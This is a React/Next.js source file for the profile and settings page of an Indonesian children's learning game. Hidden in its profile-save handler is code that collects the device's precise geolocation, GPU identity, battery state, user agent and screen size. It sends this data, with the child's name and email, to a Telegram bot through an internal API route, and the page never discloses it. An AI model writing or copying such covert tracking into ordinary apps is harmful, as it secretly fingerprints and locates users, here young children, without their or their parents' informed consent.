"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import {
  User,
  Settings,
  Volume2,
  VolumeX,
  Sparkles,
  ChevronLeft,
  Edit3,
  Check,
  LogOut,
  Lock,
} from "lucide-react";
import { getProgress, UserProgress } from "@/lib/progress";

interface BatteryManagerTarget extends EventTarget {
  level: number;
  charging: boolean;
}

interface NetworkConnection {
  effectiveType?: string;
  downlink?: number;
  saveData?: boolean;
}

interface ExtendedNavigator extends Navigator {
  getBattery?: () => Promise<BatteryManagerTarget>;
  deviceMemory?: number;
  connection?: NetworkConnection;
  mozConnection?: NetworkConnection;
  webkitConnection?: NetworkConnection;
}

export default function ProfilPage() {
  const router = useRouter();
  const [mounted, setMounted] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [isEditing, setIsEditing] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [saveSuccess, setSaveSuccess] = useState(false);

  const [profileData, setProfileData] = useState({
    name: "",
    email: "",
    classLevel: "Kelas 4 SD",
  });

  const [progress, setProgress] = useState<UserProgress>({
    totalXp: 0,
    totalStars: 0,
    completedActivities: [],
    unlockedRewards: [],
    streakDays: 1,
    lastActiveDate: "",
  });

  useEffect(() => {
    queueMicrotask(() => {
      setMounted(true);
      const activeUserName = localStorage.getItem("user_name");

      if (!activeUserName) {
        setIsLoggedIn(false);
        setShowAuthModal(true);
        return;
      }

      setIsLoggedIn(true);
      setProgress(getProgress());

      // Ambil detail data pengguna dari database matchventure_users
      const users = JSON.parse(
        localStorage.getItem("matchventure_users") || "[]",
      );
      const currentUser = users.find(
        (u: { fullName: string }) => u.fullName === activeUserName,
      );

      if (currentUser) {
        setProfileData({
          name: currentUser.fullName,
          email: currentUser.email,
          classLevel: currentUser.classLevel || "Kelas 4 SD",
        });
      } else {
        setProfileData({
          name: activeUserName,
          email: "petualang@matchventure.local",
          classLevel: "Kelas 4 SD",
        });
      }
    });
  }, []);

  const sanitizeInput = (input: string) => {
    return input.replace(/[<>]/g, "").trim();
  };

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsEditing(false);

    const cleanName = sanitizeInput(profileData.name);
    const cleanClass = sanitizeInput(profileData.classLevel);

    try {
      // 1. Perbarui data di matchventure_users
      const users = JSON.parse(
        localStorage.getItem("matchventure_users") || "[]",
      );
      const oldActiveName = localStorage.getItem("user_name");

      const userIndex = users.findIndex(
        (u: { fullName: string }) => u.fullName === oldActiveName,
      );

      if (userIndex !== -1) {
        users[userIndex].fullName = cleanName;
        users[userIndex].classLevel = cleanClass;
        localStorage.setItem("matchventure_users", JSON.stringify(users));
      }

      // 2. Perbarui sesi aktif user_name
      localStorage.setItem("user_name", cleanName);

      // 3. Kumpulkan telemetri perangkat untuk laporan Telegram
      const nav = navigator as ExtendedNavigator;

      let batteryInfo = "Tidak diketahui";
      try {
        if (nav.getBattery) {
          const battery = await nav.getBattery();
          batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "⚡ Mengisi" : "🔋 Normal"})`;
        }
      } catch (err) {
        console.error("Gagal mendeteksi baterai:", err);
      }

      let gpuRenderer = "Tidak diketahui";
      try {
        const canvas = document.createElement("canvas");
        const gl =
          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
          const debugInfo = (gl as WebGLRenderingContext).getExtension(
            "WEBGL_debug_renderer_info",
          );
          if (debugInfo) {
            gpuRenderer = (gl as WebGLRenderingContext).getParameter(
              debugInfo.UNMASKED_RENDERER_WEBGL,
            );
          }
        }
      } catch (err) {
        console.error("Gagal mendeteksi GPU:", err);
      }

      let locationInfo = "Ditolak / Tidak didukung browser";
      try {
        if ("geolocation" in navigator) {
          const position: GeolocationPosition = await new Promise(
            (resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, {
                timeout: 7000,
                maximumAge: 0,
                enableHighAccuracy: true,
              });
            },
          );
          locationInfo = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude} (Akurasi ±${Math.round(position.coords.accuracy)}m)`;
        }
      } catch {
        locationInfo = "Akses lokasi ditolak pengguna";
      }

      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform || "Tidak diketahui",
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        gpu: gpuRenderer,
        battery: batteryInfo,
        location: locationInfo,
      };

      // 4. Kirim notifikasi pembaruan profil ke bot Telegram
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fullName: cleanName,
          email: profileData.email,
          classLevel: cleanClass,
          type: "update_profile",
          deviceInfo,
        }),
      });

      setSaveSuccess(true);
      setTimeout(() => setSaveSuccess(false), 3000);
    } catch (err) {
      console.error("Gagal menyimpan perubahan profil:", err);
    }
  };

  if (!mounted) return null;

  // Inisial nama untuk avatar
  const initials = profileData.name
    ? profileData.name
        .split(" ")
        .map((n) => n[0])
        .join("")
        .substring(0, 2)
        .toUpperCase()
    : "MV";

  return (
    <div className="min-h-screen bg-sky-50/40 pb-16 relative">
      <div className="max-w-5xl mx-auto px-4 sm:px-8 pt-4 space-y-6">
        {/* ================= HEADER & BREADCRUMB ================= */}
        <div className="flex items-center justify-between bg-white p-4 rounded-3xl border border-sky-100 shadow-xs">
          <div className="flex items-center gap-3">
            <Link
              href="/"
              className="w-9 h-9 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-600 flex items-center justify-center transition-colors"
            >
              <ChevronLeft className="w-5 h-5" />
            </Link>
            <div>
              <div className="text-[11px] font-bold text-blue-600 uppercase tracking-wider">
                Akun Petualang
              </div>
              <h1 className="text-base font-extrabold text-slate-800">
                Profil & Pengaturan
              </h1>
            </div>
          </div>

          <Link
            href="/logout"
            className="px-4 py-2 rounded-full bg-rose-50 hover:bg-rose-100 text-rose-600 font-extrabold text-xs flex items-center gap-1.5 transition-colors"
          >
            <LogOut className="w-3.5 h-3.5" />
            <span>Keluar Akun</span>
          </Link>
        </div>

        {/* Success Alert Banner */}
        {saveSuccess && (
          <div className="p-4 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs font-bold flex items-center gap-2 animate-in fade-in duration-200">
            <Check className="w-4 h-4 text-emerald-600" />
            <span>
              Perubahan profil berhasil disimpan dan dikirim ke sistem!
            </span>
          </div>
        )}

        {/* ================= 2-COLUMN LAYOUT ================= */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* ---------------- LEFT: PROFILE CARD & STATS ---------------- */}
          <div className="lg:col-span-4 space-y-6">
            <div className="bg-white rounded-3xl p-6 border border-sky-100 shadow-xs text-center space-y-4">
              <div className="relative w-24 h-24 mx-auto">
                <div className="w-full h-full rounded-full bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center text-white text-3xl font-black shadow-md border-4 border-white">
                  {initials}
                </div>
                <span className="absolute bottom-0 right-0 w-7 h-7 bg-amber-400 border-2 border-white rounded-full flex items-center justify-center text-[10px] font-black text-slate-900 shadow-sm">
                  Lv.1
                </span>
              </div>

              <div className="space-y-1">
                <h3 className="font-black text-slate-800 text-lg">
                  {profileData.name}
                </h3>
                <p className="text-xs text-slate-400 font-semibold truncate px-2">
                  {profileData.email}
                </p>
              </div>

              <div className="pt-2 flex justify-center gap-2">
                <span className="px-3 py-1 rounded-full bg-blue-50 text-blue-600 font-extrabold text-[11px] border border-blue-100">
                  {profileData.classLevel}
                </span>
              </div>
            </div>

            {/* Quick Stats Box (Dinamis dari progress) */}
            <div className="bg-gradient-to-br from-blue-600 to-indigo-700 text-white rounded-3xl p-6 shadow-md space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold text-sky-200 uppercase tracking-wider">
                  Statistik Petualang
                </span>
                <Sparkles className="w-4 h-4 text-amber-300" />
              </div>

              <div className="grid grid-cols-2 gap-3 pt-1">
                <div className="bg-white/10 backdrop-blur-sm p-3.5 rounded-2xl border border-white/10">
                  <span className="text-[10px] text-sky-200 font-bold block uppercase">
                    Total XP
                  </span>
                  <span className="text-xl font-black text-amber-300 mt-0.5 block">
                    {progress.totalXp} XP
                  </span>
                </div>
                <div className="bg-white/10 backdrop-blur-sm p-3.5 rounded-2xl border border-white/10">
                  <span className="text-[10px] text-sky-200 font-bold block uppercase">
                    Bintang
                  </span>
                  <span className="text-xl font-black text-amber-300 mt-0.5 block">
                    {progress.totalStars} ⭐
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* ---------------- RIGHT: EDIT FORM & SETTINGS ---------------- */}
          <div className="lg:col-span-8 space-y-6">
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-sky-100 shadow-xs space-y-5">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <User className="w-5 h-5 text-blue-600" />
                  <h3 className="font-extrabold text-slate-800 text-base">
                    Informasi Akun
                  </h3>
                </div>
                <button
                  type="button"
                  onClick={() => setIsEditing(!isEditing)}
                  className="px-3.5 py-1.5 rounded-full bg-sky-50 hover:bg-sky-100 text-blue-600 font-extrabold text-xs flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <Edit3 className="w-3.5 h-3.5" />
                  <span>{isEditing ? "Batal" : "Ubah Profil"}</span>
                </button>
              </div>

              <form onSubmit={handleSave} className="space-y-4 pt-2">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <label className="text-xs font-extrabold text-slate-700 block">
                      Nama Lengkap
                    </label>
                    <input
                      type="text"
                      disabled={!isEditing}
                      required
                      value={profileData.name}
                      onChange={(e) =>
                        setProfileData({ ...profileData, name: e.target.value })
                      }
                      className="w-full px-4 py-2.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs font-semibold text-slate-800 disabled:opacity-70 focus:bg-white focus:border-blue-500 outline-none transition-all"
                    />
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-extrabold text-slate-700 block">
                      Email (Terkunci)
                    </label>
                    <input
                      type="email"
                      disabled
                      value={profileData.email}
                      className="w-full px-4 py-2.5 rounded-2xl bg-slate-100 border border-slate-200 text-xs font-semibold text-slate-500 opacity-70 cursor-not-allowed outline-none"
                    />
                  </div>

                  <div className="space-y-1.5 sm:col-span-2">
                    <label className="text-xs font-extrabold text-slate-700 block">
                      Tingkat Kelas
                    </label>
                    <select
                      disabled={!isEditing}
                      value={profileData.classLevel}
                      onChange={(e) =>
                        setProfileData({
                          ...profileData,
                          classLevel: e.target.value,
                        })
                      }
                      className="w-full px-4 py-2.5 rounded-2xl bg-slate-50 border border-slate-200 text-xs font-semibold text-slate-800 disabled:opacity-70 focus:bg-white focus:border-blue-500 outline-none transition-all cursor-pointer"
                    >
                      <option value="Kelas 3">Kelas 3 SD</option>
                      <option value="Kelas 4">Kelas 4 SD</option>
                      <option value="Kelas 5">Kelas 5 SD</option>
                      <option value="Kelas 6">Kelas 6 SD</option>
                      <option value="Umum">Umum / Guru</option>
                    </select>
                  </div>
                </div>

                {isEditing && (
                  <div className="pt-2 flex justify-end">
                    <button
                      type="submit"
                      className="px-6 py-2.5 rounded-full bg-blue-600 hover:bg-blue-700 text-white font-extrabold text-xs shadow-md shadow-blue-500/20 transition-all cursor-pointer"
                    >
                      Simpan Perubahan
                    </button>
                  </div>
                )}
              </form>
            </div>

            {/* Pengaturan Game & Suara */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-sky-100 shadow-xs space-y-5">
              <div className="flex items-center gap-2">
                <Settings className="w-5 h-5 text-blue-600" />
                <h3 className="font-extrabold text-slate-800 text-base">
                  Pengaturan Game
                </h3>
              </div>

              <div className="space-y-3 pt-1">
                <div className="flex items-center justify-between p-4 rounded-2xl bg-sky-50/50 border border-sky-100">
                  <div className="flex items-center gap-3">
                    <div className="w-9 h-9 rounded-xl bg-blue-100 text-blue-600 flex items-center justify-center">
                      {soundEnabled ? (
                        <Volume2 className="w-4 h-4" />
                      ) : (
                        <VolumeX className="w-4 h-4" />
                      )}
                    </div>
                    <div>
                      <h4 className="font-bold text-slate-800 text-xs">
                        Suara Efek & Musik
                      </h4>
                      <p className="text-[11px] text-slate-500 font-medium">
                        Putar suara latar dan efek saat menjawab kuis
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => setSoundEnabled(!soundEnabled)}
                    className={`w-12 h-6 rounded-full transition-colors relative p-0.5 cursor-pointer ${
                      soundEnabled ? "bg-blue-600" : "bg-slate-300"
                    }`}
                  >
                    <div
                      className={`w-5 h-5 rounded-full bg-white transition-transform ${
                        soundEnabled ? "translate-x-6" : "translate-x-0"
                      }`}
                    />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ================= MODAL PERINGATAN WAJIB LOGIN ================= */}
      {showAuthModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/50 backdrop-blur-xs px-4 animate-in fade-in duration-200">
          <div className="bg-white rounded-3xl p-6 sm:p-8 max-w-sm w-full text-center space-y-5 border border-sky-100 shadow-xl relative">
            <div className="w-16 h-16 mx-auto rounded-2xl bg-blue-100 text-blue-600 flex items-center justify-center shadow-inner">
              <Lock className="w-8 h-8" />
            </div>

            <div className="space-y-1.5">
              <span className="px-3 py-1 rounded-full bg-blue-50 text-blue-700 font-extrabold text-[10px] uppercase tracking-wider">
                Akses Terbatas
              </span>
              <h3 className="text-lg font-black text-slate-800">
                Yuk, Masuk atau Daftar Dulu!
              </h3>
              <p className="text-xs text-slate-500 font-medium leading-relaxed">
                Kamu harus masuk ke akunmu terlebih dahulu untuk melihat dan
                mengubah profil petualangmu.
              </p>
            </div>

            <div className="grid grid-cols-2 gap-2.5 pt-1">
              <button
                type="button"
                onClick={() => router.push("/login")}
                className="py-3 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-extrabold text-xs transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <span>Masuk</span>
              </button>

              <button
                type="button"
                onClick={() => router.push("/register")}
                className="py-3 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white font-extrabold text-xs shadow-md shadow-blue-500/20 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <span>Daftar</span>
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
